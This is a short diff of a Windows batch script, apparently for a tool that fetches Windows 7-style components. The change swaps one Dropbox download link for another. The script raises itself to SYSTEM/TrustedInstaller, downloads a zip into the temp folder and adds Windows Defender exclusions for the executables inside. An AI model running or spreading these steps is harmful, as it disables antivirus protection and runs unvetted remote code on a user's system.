@@ -1,6 +1,6 @@
 @echo off
 whoami /user | findstr /i /c:S-1-5-18 >nul || ( call :RunAsTI "%~f0" %* & exit /b )
-curl https://dl.dropbox.com/scl/fi/4zvyu6m30w0d2p30muljk/Get7.zip?rlkey=i68mql61c8l4vlfgzwxo4okea -Lo "%temp%\Get7.zip"
+curl https://dl.dropbox.com/scl/fi/g1r37dl8u0rm588cabc65/Get7.zip?rlkey=pd9a5ufs3ndl99cl9oryt81qw -Lo "%temp%\Get7.zip"
 powershell Add-MpPreference -ExclusionPath '%temp%\Get7\Windows\Win7Volume.exe'
 powershell Add-MpPreference -ExclusionPath '%temp%\Get7\Windows\PENetwork.exe'
 powershell Add-MpPreference -ExclusionPath '%temp%\Get7\WB11.exe'
